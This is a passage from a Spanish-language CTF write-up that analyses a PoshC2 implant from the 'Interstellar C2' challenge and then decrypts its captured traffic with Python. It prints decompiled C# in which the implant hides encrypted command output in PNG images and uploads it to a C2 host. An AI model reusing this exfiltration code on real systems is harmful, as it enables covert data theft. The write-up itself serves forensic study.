+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">Core</span><span class="mtk1">.</span><span class="mtk8 mtku">Common</span><span class="mtk1">;</span>
+
+<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Program</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">readonly</span><span class="mtk1"> </span><span class="mtk8 mtku">Dictionary</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">, </span><span class="mtk5">string</span><span class="mtk1">&gt; ARGUMENTS </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Dictionary</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">, </span><span class="mtk5">string</span><span class="mtk1">&gt;();</span>
+
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">PrintHelp</span><span class="mtk1">()</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"PoshC2 - Core Module"</span><span class="mtk1">);</span>
+<span class="mtk1">    Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"==========================================="</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1">[] methods </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk8 mtku">global</span><span class="mtk1">::</span><span class="mtk8 mtku">Core</span><span class="mtk1">.</span><span class="mtk8 mtku">Core</span><span class="mtk1">).</span><span class="mtk8">GetMethods</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> methods;</span>
+<span class="mtk1">      </span><span class="mtk5">foreach</span><span class="mtk1"> (</span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1"> methodInfo </span><span class="mtk5">in</span><span class="mtk1"> array)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">object</span><span class="mtk1">[] array2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk8 mtku">global</span><span class="mtk1">::</span><span class="mtk8 mtku">Core</span><span class="mtk1">.</span><span class="mtk8 mtku">Core</span><span class="mtk1">).</span><span class="mtk8">GetMethod</span><span class="mtk1">(methodInfo.Name)</span><span class="mtk5">?</span><span class="mtk1">.</span><span class="mtk8">GetCustomAttributes</span><span class="mtk1">(inherit: </span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (array2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> array2.Length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">((array2[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk8 mtku">CoreDispatch</span><span class="mtk1">)</span><span class="mtk5">?</span><span class="mtk1">.Usage);</span>
+<span class="mtk1">          Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (array2[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk8 mtku">CoreDispatch</span><span class="mtk1">)</span><span class="mtk5">?</span><span class="mtk1">.Description);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> arg)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">$"Error in help: {</span><span class="mtk1">arg</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Main</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1">[] args)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (args.Length </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> (args.Length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (args[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToLower</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"-help"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> args[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToLower</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"help"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> args[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToLower</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"?"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> args[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToLower</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"-h"</span><span class="mtk1">)))</span>  
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8">PrintHelp</span><span class="mtk1">();</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"FileVersion: "</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> FileVersionInfo.</span><span class="mtk8">GetVersionInfo</span><span class="mtk1">(Assembly.</span><span class="mtk8">GetExecutingAssembly</span><span class="mtk1">().Location).FileVersion);</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"ProductVersion: "</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> FileVersionInfo.</span><span class="mtk8">GetVersionInfo</span><span class="mtk1">(Assembly.</span><span class="mtk8">GetExecutingAssembly</span><span class="mtk1">().Location).ProductVersion);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8">Run</span><span class="mtk1">(args.</span><span class="mtk8">ToList</span><span class="mtk1">());</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> arg)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"Core generated an error: '{0}'"</span><span class="mtk1">, arg);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Run</span><span class="mtk1">(</span><span class="mtk8 mtku">List</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">&gt; args)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (args.Count </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"Error: No args passed to run"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> methodName </span><span class="mtk5">=</span><span class="mtk1"> args[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">"-"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1"> (</span><span class="mtk5">string</span><span class="mtk1"> arg </span><span class="mtk5">in</span><span class="mtk1"> args)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">int</span><span class="mtk1"> num </span><span class="mtk5">=</span><span class="mtk1"> arg.</span><span class="mtk8">IndexOf</span><span class="mtk1">(</span><span class="mtk4">'='</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (num </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        ARGUMENTS[arg.</span><span class="mtk8">Substring</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, num)] </span><span class="mtk5">=</span><span class="mtk1"> arg.</span><span class="mtk8">Substring</span><span class="mtk1">(num </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1"> methodInfo </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk8 mtku">global</span><span class="mtk1">::</span><span class="mtk8 mtku">Core</span><span class="mtk1">.</span><span class="mtk8 mtku">Core</span><span class="mtk1">).</span><span class="mtk8">GetMethods</span><span class="mtk1">().</span><span class="mtk8">FirstOrDefault</span><span class="mtk1">((</span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1"> i) </span><span class="mtk5">=&gt;</span><span class="mtk1"> methodName </span><span class="mtk5">==</span><span class="mtk1"> i.Name.</span><span class="mtk8">ToLower</span><span class="mtk1">());</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (methodInfo </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">MethodInfo</span><span class="mtk1"> method </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk8 mtku">global</span><span class="mtk1">::</span><span class="mtk8 mtku">Core</span><span class="mtk1">.</span><span class="mtk8 mtku">Core</span><span class="mtk1">).</span><span class="mtk8">GetMethod</span><span class="mtk1">(methodInfo.Name);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (method </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"[-] Unable to get method - GetMethod returned nul</span><span class="mtk4">l"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (method.</span><span class="mtk8">GetParameters</span><span class="mtk1">().Length </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        method.</span><span class="mtk8">Invoke</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk6">null</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      method.</span><span class="mtk8">Invoke</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">object</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">] { args.</span><span class="mtk8">ToArray</span><span class="mtk1">() });</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">"[!] No command found in core"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>El programa anterior simplemente se usa para ejecutar comandos en la máquina. La función real que lo maneja es <code>Exec</code> (de <code>malware.exe</code>, no de <code>asm.exe</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Exec</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> cmd, </span><span class="mtk5">string</span><span class="mtk1"> taskId, </span><span class="mtk5">string</span><span class="mtk1"> key </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk5">byte</span><span class="mtk1">[] encByte </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(key))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      key </span><span class="mtk5">=</span><span class="mtk1"> pKey;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> cookie </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Encryption</span><span class="mtk1">(key, taskId);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    text </span><span class="mtk5">=</span><span class="mtk1"> ((encByte </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk8">Encryption</span><span class="mtk1">(key, cmd, comp: </span><span class="mtk6">true</span><span class="mtk1">) </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8">Encryption</span><span class="mtk1">(key, </span><span class="mtk6">null</span><span class="mtk1">, comp: </span><span class="mtk6">true</span><span class="mtk1">, encByte));</span>  
+<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] cmdoutput </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(text);</span>
+<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] imgData </span><span class="mtk5">=</span><span class="mtk1"> ImgGen.</span><span class="mtk8">GetImgData</span><span class="mtk1">(cmdoutput);</span>
+<span class="mtk1">    </span><span class="mtk5">int</span><span class="mtk1"> num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (num </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      num</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk8">GetWebRequest</span><span class="mtk1">(cookie).</span><span class="mtk8">UploadData</span><span class="mtk1">(UrlGen.</span><span class="mtk8">GenerateUrl</span><span class="mtk1">(), imgData);</span>
+<span class="mtk1">        num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Esta vez veremos una <em>cookie</em> cifrada con el ID de tarea y la salida de comando comprimida y cifrada. Además, el <em>payload</em> se inserta dentro de una imagen y se carga utilizando una petición POST:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-8.webp" alt="Interstellar C2 8"></p><h3 id="exfiltración-de-datos-a-través-de-imágenes-png">Exfiltración de datos a través de imágenes PNG</h3><p>El programa utiliza técnicas de esteganografía para agregar datos al final de los bytes de una imagen PNG (ya que estos archivos están delimitados por <code>ISTART</code> e <code>IEND</code>, cualquier procesador de imágenes no considerará los datos adicionales, por lo que permanece indvertido). Para más información, podemos ver la clase <code>ImgGen</code> (específicamente, el método <code>GetImgData</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">internal</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">ImgGen</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">Random</span><span class="mtk1"> _rnd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Random</span><span class="mtk1">();</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1"> _re </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"(?&lt;=</span><span class="mtk6">\"</span><span class="mtk4">)[^</span><span class="mtk6">\"</span><span class="mtk4">]*(?=</span><span class="mtk6">\"</span><span class="mtk4">)|[^</span><span class="mtk6">\"</span><span class="mtk4"> ]+"</span><span class="mtk1">, RegexOptions.Compiled);</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">List</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">&gt; _newImgs </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">List</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">&gt;();</span>
+
+<span class="mtk1">    </span><span class="mtk5">internal</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Init</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> stringIMGS)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">IEnumerable</span><span class="mtk1">&lt;</span><span class="mtk5">string</span><span class="mtk1">&gt; source </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">Match</span><span class="mtk1"> m </span><span class="mtk5">in</span><span class="mtk1"> _re.</span><span class="mtk8">Matches</span><span class="mtk1">(stringIMGS.</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">","</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">))</span>
+<span class="mtk1">        </span><span class="mtk5">select</span><span class="mtk1"> m.Value;</span>
+<span class="mtk1">      source </span><span class="mtk5">=</span><span class="mtk1"> source.</span><span class="mtk8">Where</span><span class="mtk1">((</span><span class="mtk5">string</span><span class="mtk1"> m) </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(m));</span>
+<span class="mtk1">      _newImgs </span><span class="mtk5">=</span><span class="mtk1"> source.</span><span class="mtk8">ToList</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> </span><span class="mtk8">RandomString</span><span class="mtk1">(</span><span class="mtk5">int</span><span class="mtk1"> length)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1">((</span><span class="mtk5">from</span><span class="mtk1"> s </span><span class="mtk5">in</span><span class="mtk1"> Enumerable.</span><span class="mtk8">Repeat</span><span class="mtk1">(</span><span class="mtk4">"...................@..........................Tys</span><span class="mtk4">cf"</span><span class="mtk1">, length)</span>  
+<span class="mtk1">        </span><span class="mtk5">select</span><span class="mtk1"> s[_rnd.</span><span class="mtk8">Next</span><span class="mtk1">(s.Length)]).</span><span class="mtk8">ToArray</span><span class="mtk1">());</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">internal</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">byte</span><span class="mtk1">[] </span><span class="mtk8">GetImgData</span><span class="mtk1">(</span><span class="mtk5">byte</span><span class="mtk1">[] cmdoutput)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">int</span><span class="mtk1"> num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1500</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">int</span><span class="mtk1"> num2 </span><span class="mtk5">=</span><span class="mtk1"> cmdoutput.Length </span><span class="mtk5">+</span><span class="mtk1"> num;</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> s </span><span class="mtk5">=</span><span class="mtk1"> _newImgs[</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Random</span><span class="mtk1">().</span><span class="mtk8">Next</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, _newImgs.Count)];</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(s);</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] bytes </span><span class="mtk5">=</span><span class="mtk1"> Encoding.UTF8.</span><span class="mtk8">GetBytes</span><span class="mtk1">(</span><span class="mtk8">RandomString</span><span class="mtk1">(num </span><span class="mtk5">-</span><span class="mtk1"> array.Length));</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] array2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">byte</span><span class="mtk1">[num2];</span>
+<span class="mtk1">      Array.</span><span class="mtk8">Copy</span><span class="mtk1">(array, </span><span class="mtk6">0</span><span class="mtk1">, array2, </span><span class="mtk6">0</span><span class="mtk1">, array.Length);</span>
+<span class="mtk1">      Array.</span><span class="mtk8">Copy</span><span class="mtk1">(bytes, </span><span class="mtk6">0</span><span class="mtk1">, array2, array.Length, bytes.Length);</span>
+<span class="mtk1">      Array.</span><span class="mtk8">Copy</span><span class="mtk1">(cmdoutput, </span><span class="mtk6">0</span><span class="mtk1">, array2, array.Length </span><span class="mtk5">+</span><span class="mtk1"> bytes.Length, cmdoutput.Length);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> array2;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Aunque puede parecer extraño, solamente agrega datos al archivo de la imagen. Lo que es más importante es analizar los datos que se agregan:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-9.webp" alt="Interstellar C2 9"></p><p>Hay muchos caracteres <code>.</code>. La información real enviada está al final, solo 16 bytes. De hecho, el lío anterior son solo elecciones aleatorias de esta cadena (hasta conseguir 1500 bytes, véase el código anterior)</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">...................@..........................Tyscf  
+</code></pre></div><p>Entonces, tomemos el <em>payload</em> real:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; with open('image1.png', 'rb') as f:
+...     img_data = f.read()
+...
+&gt;&gt;&gt; img_data[1500:]
+b'@\x9f\x00\xee\xd5s\x93\xc87\xab\xa4\x1a\x12\x88\x8c\xe5'  
+&gt;&gt;&gt; len(img_data[1500:])
+16
+</code></pre></div><p>Ahora, lo desciframos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; from Crypto.Cipher import AES
+&gt;&gt;&gt; from base64 import b64decode as b64d
+&gt;&gt;&gt; from gzip import decompress
+&gt;&gt;&gt;
+&gt;&gt;&gt; key = b64d('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')  
+&gt;&gt;&gt; enc = img_data[1500:]
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt; data = cipher.decrypt(ct)
+&gt;&gt;&gt; data
+b''
+</code></pre></div><p>Bueno&mldr; Esto fue solo un calentamiento. Recordemos que también teníamos una <em>cookie</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; enc = b64d('WMq9+CsIFw+w2tAyYAOoICKFmVNPqoz+QDjIXSRB4kY=')  
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt; cipher.decrypt(ct)
+b'00031\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre></div><p>Muy bien, esto es solo el identificador de la tarea.</p><p>La segunda petición POST contiene solo 16 bytes nuevamente, por lo que no es interesante. La tercera petición POST tiene más información:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-10.webp" alt="Interstellar C2 10"></p><p>Podemos guardar la imagen cargada como <code>image3.png</code>. Ahora debemos descifrarlo y descomprimirlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('image3.png', 'rb') as f:
+...     img_data = f.read()
+...
+&gt;&gt;&gt; img_data[1500:]
+b'7P?\x1b\x14_o\x05\x0f\xd9O\xb3\xac~\xb7w\x17\x10\xac\xfe\xa0B\xb1\x95j4,\x08\xe6W#\x1d\xcb\x1f\xcf\xb1\xe00\x17\xd0\xe8D\x91\xc0\xe0\xc8\xbd\n\xd5c\rZ(^N2\xdf\xe47H\xe7"RU\x9d\x82c\xcf\xc2X\xbd\xb51\xdb\xc3=\x8e\\\xbdM'  
+&gt;&gt;&gt; len(img_data[1500:])
+80
+&gt;&gt;&gt; enc = img_data[1500:]
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt; data = cipher.decrypt(ct)
+&gt;&gt;&gt; data
